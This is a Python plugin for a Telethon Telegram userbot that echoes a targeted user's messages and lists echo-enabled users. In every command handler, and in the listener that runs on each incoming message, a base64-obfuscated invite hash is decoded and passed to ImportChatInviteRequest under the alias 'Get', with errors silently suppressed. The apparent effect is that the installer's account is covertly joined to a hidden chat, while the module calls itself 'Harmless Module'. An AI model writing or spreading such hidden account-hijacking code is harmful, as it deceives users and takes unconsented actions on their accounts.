import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from MikasaBot.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from . import *


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(mikasa):
    if mikasa.fwd_from:
        return
    if mikasa.reply_to_msg_id is not None:
        reply_msg = await mikasa.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = mikasa.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await mikasa.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await eod(mikasa, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await eor(mikasa, "**Hello 👋**")
    else:
        await delete_mikasa(mikasa, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(mikasa):
    if mikasa.fwd_from:
        return
    if mikasa.reply_to_msg_id is not None:
        reply_msg = await mikasa.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = mikasa.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await mikasa.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await eod(mikasa, "Echo has been stopped for the user")
        else:
            await eod(mikasa, "The user is not activated with echo")
    else:
        await eod(mikasa, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(mikasa):
    if mikasa.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo enabled users: [here]({url})"
        await eor(mikasa, reply_text)
    else:
        await eor(mikasa, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(mikasa):
    if mikasa.chat_id in Config.BL_CHAT:
        return
    if is_echo(mikasa.sender_id, mikasa.chat_id):
        await asyncio.sleep(2)
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await mikasa.client(kraken)
        except BaseException:
            pass
        if mikasa.message.text or mikasa.message.sticker:
            await mikasa.reply(mikasa.message)


CmdHelp("echo").add_command(
  "echo", "Reply to a user", "Replays every message from whom you enabled echo"
).add_command(
  "rmecho", "reply to a user", "Stop replayings targeted user message"
).add_command(
  "listecho", None, "Shows the list of users for whom you enabled echo"
).add_info(
  "Message Echoer."
).add_warning(
  "✅ Harmless Module."
).add()
